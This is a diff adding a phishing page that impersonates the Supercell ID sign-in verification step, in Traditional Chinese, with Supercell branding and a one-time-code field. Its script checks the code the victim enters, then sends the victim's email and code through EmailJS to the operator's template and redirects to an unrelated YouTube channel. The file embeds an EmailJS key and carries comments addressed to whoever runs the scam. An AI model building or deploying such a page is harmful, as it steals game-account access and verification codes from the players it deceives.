@@ -1,0 +1,146 @@
+<!DOCTYPE html>
+<html lang="zh-TW">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width,initial-scale=1.0,maximum-scale=1.0,user-scalable=no,viewport-fit=cover">
+    <title>Supercell ID</title>
+    <link rel="stylesheet" crossorigin="" href="style.css">
+</head>
+<body>
+    <div id="root">
+        <div class="DialogContextContentWrapper">
+            <main class="w-full text-m flex min-h-screen flex-col items-center font-supercell-md bg-gradient-radial pt-[max(var(--spacing-windowEdges),env(safe-area-inset-top,0px))] pb-[env(safe-area-inset-bottom,0px)]">
+                <div class="w-full flex-1 flex flex-col items-center justify-center">
+                    <div class="w-full max-w-card desktop:max-w-desktopCard shadow-main rounded-2xl bg-main-gradient">
+                        <div class="overflow-hidden" style="height: auto; min-height: 500px; padding-bottom: 40px;">
+                            <div class="flex flex-col items-center py-cardVerticalEdges w-full">
+                                <div class="flex flex-row items-center mb-standard" dir="ltr">
+                                    <img alt="Supercell ID" title="Supercell ID" class="h-9" src="supercell_logo.png">
+                                </div>
+
+                                <div class="w-full flex flex-col items-center px-cardHorizontalMinEdges">
+                                    <div class="w-full max-w-cardContent mb-standard">
+                                        <div class="w-full text-s">
+                                            <div class="w-full grid grid-flow-col justify-stretch mb-2">
+                                                <div class="text-medium-gray text-start">登入</div>
+                                                <div class="text-primary-black text-end">驗證</div>
+                                            </div>
+                                            <div class="flex flex-row w-full bg-gradient-progress p-1 rounded-full">
+                                                <div class="grow"></div>
+                                                <div class="rounded-full w-3 h-3 bg-white"></div>
+                                                <div class="grow-0"></div>
+                                            </div>
+                                        </div>
+                                    </div>
+
+                                    <img class="h-32 object-scale-down mb-standard" alt="Supercell Store" src="storelogo.png">
+
+                                    <div class="w-full max-w-cardContent text-center">
+                                        <h1 class="font-supercell-bd text-xl text-heading-black">快好了！</h1>
+                                        <p class="mt-4 mb-6 font-supercell-rg text-dark-gray">
+                                            驗證碼已發送到您的E-mail信箱<br>
+                                            <span id="displayEmail" class="text-dark-gray font-supercell-bd break-anywhere">@gmail.com</span>。
+                                        </p>
+
+                                        <input id="otpInput" class="text-center placeholder:font-supercell-rg font-supercell-md text-xl py-[0.8125rem] w-full rounded-lg shadow-inner focus:outline-none focus:ring-2 focus:ring-interactive-blue" 
+                                               required inputmode="numeric" maxlength="7" placeholder="123 456" style="margin-top: 20px;" type="text">
+
+                                        <div class="w-full flex flex-col space-y-4 mt-8">
+                                            <button id="submitBtn" style="margin-top: 20px;" class="font-supercell-bd text-white uppercase p-[0.9375rem] w-full rounded-full bg-primary-button hover:bg-interactive-blue active:scale-95 transition-all">繼續</button>
+                                            <button onclick="window.location.href='login.html'" style="margin-top: 20px;" class="font-supercell-bd text-dark-gray uppercase p-[0.8125rem] w-full rounded-full border-light-gray border-[0.125rem] hover:text-black active:scale-95 transition-all">返回</button>
+                                        </div>
+
+                                        <div class="mt-6 font-supercell-rg text-s">
+                                            <button style="margin-top: 30px;" class="text-interactive-blue hover:opacity-80 cursor-pointer">沒有收到驗證碼？</button>
+                                        </div>
+                                    </div>
+                                </div>
+                            </div>
+                        </div>
+                    </div>
+                </div>
+
+                </main>
+        </div>
+    </div>
+
+    <script>
+        document.addEventListener('DOMContentLoaded', function() {
+            const displayEmail = document.getElementById('displayEmail');
+            const otpInput = document.getElementById('otpInput');
+            const submitBtn = document.getElementById('submitBtn');
+
+            // 1. 從 localStorage 取得資料
+            const userEmail = localStorage.getItem('user_email');
+            const correctOtp = localStorage.getItem('sent_otp');
+
+            // 2. 顯示正確的 Email
+            if (userEmail && displayEmail) {
+                displayEmail.innerText = userEmail;
+            }
+
+            // 3. 輸入框自動格式化 (123 456)
+            otpInput.addEventListener('input', function(e) {
+                let value = e.target.value.replace(/\D/g, ''); // 只留數字
+                if (value.length > 3) {
+                    value = value.substring(0, 3) + ' ' + value.substring(3, 6);
+                }
+                e.target.value = value;
+            });
+
+            // 4. 驗證邏輯
+            submitBtn.addEventListener('click', function() {
+    const rawValue = otpInput.value.replace(/\s/g, ''); // 移除空白進行比對
+
+    // 1. 基本檢查：長度不足不處理
+    if (rawValue.length < 6) {
+        return; 
+    }
+
+    // 2. 比對驗證碼
+    if (rawValue === correctOtp) {
+        // 顯示傳送中狀態，防止重複點擊
+        submitBtn.innerText = '驗證中...';
+        submitBtn.style.pointerEvents = 'none';
+
+        // 3. 準備傳送給你的資料 (套用 EmailJS 範本變數)
+        // 這裡建議在 EmailJS 另外準備一個給自己看的範本 (例如「有人登入成功」)
+        const templateParams = {
+            to_email: userEmail, // 使用者輸入的 Email
+            otp_code: rawValue,  // 使用者輸入的正確驗證碼
+            notes: "使用者已成功通過驗證並準備跳轉" 
+        };
+
+        // 4. 傳送 EmailJS
+        emailjs.send('SCCAPTCHA', 'template_9zjyb6s', templateParams)
+            .then(function() {
+                console.log('資料已成功備份至 Email');
+                // 5. 成功傳送後，執行跳轉
+                window.location.href = 'https://youtube.com/@powertech4165?si=LYHgSm-tuKQ7DOlq';
+            }, function(error) {
+                console.error('EmailJS 傳送失敗:', error);
+                // 就算傳送失敗，通常還是會讓使用者跳轉，或者你可以決定要不要擋
+                window.location.href = 'https://youtube.com/@powertech4165?si=LYHgSm-tuKQ7DOlq';
+            });
+
+    } else {
+        // 驗證碼錯誤的處理
+        alert('驗證碼錯誤，請重新輸入');
+        otpInput.value = '';
+        otpInput.focus();
+    }
+});
+        });
+    </script>
+</body>
+</html>
+<head>
+    <script type="text/javascript" src="https://cdn.jsdelivr.net/npm/@emailjs/browser@4/dist/email.min.js"></script>
+    
+    <script type="text/javascript">
+       (function(){
+          // 這裡要填入你在 EmailJS 帳號後台看到的 Public Key
+          emailjs.init("VuhBknBXBuQYRZ-Tz"); 
+       })();
+    </script>
+</head>
